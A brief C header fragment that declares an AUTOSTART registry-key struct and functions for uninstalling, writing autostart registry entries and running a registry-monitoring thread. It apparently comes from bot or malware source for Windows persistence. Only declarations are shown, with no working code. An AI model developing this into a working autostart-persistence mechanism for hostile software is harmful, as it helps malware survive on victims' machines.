typedef struct AUTOSTART
{
	HKEY hkey;
	LPCTSTR subkey;

} AUTOSTART;


void uninstall(void);
void AutoStartRegs(char *nfilename);
#ifndef NO_REGMON
DWORD WINAPI AutoRegistry(LPVOID param);
#endif
